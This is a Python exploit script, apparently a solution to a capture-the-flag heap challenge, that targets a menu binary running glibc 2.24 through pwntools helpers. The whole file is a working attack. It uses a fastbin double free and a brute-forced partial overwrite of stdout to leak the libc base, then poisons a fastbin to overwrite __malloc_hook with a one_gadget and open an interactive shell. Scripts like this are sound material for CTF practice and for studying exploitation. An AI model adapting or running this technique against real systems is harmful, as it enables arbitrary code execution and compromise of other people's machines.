#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc(
    "/home/eastxuelian/config/glibc-all-in-one/libs/2.24-9ubuntu2.2_amd64/libc.so.6"
)

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"[+]> ")
    sl(i2b(choice))


def push(size, data):
    cmd(1)
    ru(b"How much?\n")
    cmd(size)
    ru(b"Data?\n")
    s(data)


def pop(idx):
    cmd(2)
    ru(b"Which one?\n")
    cmd(idx)


for i in range(0x10):
    push(0x6F, i2b(i) * 8)

for i in range(0x10 - 1):
    pop(i)

ru(b"[+]> ")
sl(b"9" * 0x400)

push(0x60, b"aaa")
push(0x60, b"bbb")
luckybit = __import__("random").randint(1, 15)
push(0x60, p16(0x5BD | (luckybit << 12)))
# push(0x60, p16(0x1ACD))
pop(0x10)
pop(0x11)
pop(0x10)

push(0x60, p8(0xE0))
push(0x60, p8(0xE0))
push(0x60, p64(0xDEADBEEF))
push(0x60, p8(0xE0))
push(0x66, b"\x00" * 0x33 + p64(0xFBAD1887) + p64(0) * 3 + p8(0))

ru(p64(0xFBAD1887) + p64(0) * 3)
libc_base = u64_ex(rn(8)) - 0x3C2600
lg("libc_base", libc_base)
debugB()

push(0x60, b"ccc")
push(0x60, b"ddd")
pop(0x18)
pop(0x19)
pop(0x18)
push(0x60, p64(libc_base + 0x3C1ACD))
push(0x60, p64(0xCAFECAFE))
push(0x60, p64(0xCAFECAFE))
og = [0x4557A, 0xF1651, 0xF24CB]
push(
    0x60,
    b"\x00" * (0x13 - 8) + p64(libc_base + og[2]) + p64(libc_base + libc.sym.realloc),
)
cmd(1)
ru(b"?\n")
cmd(0x20)

ia()
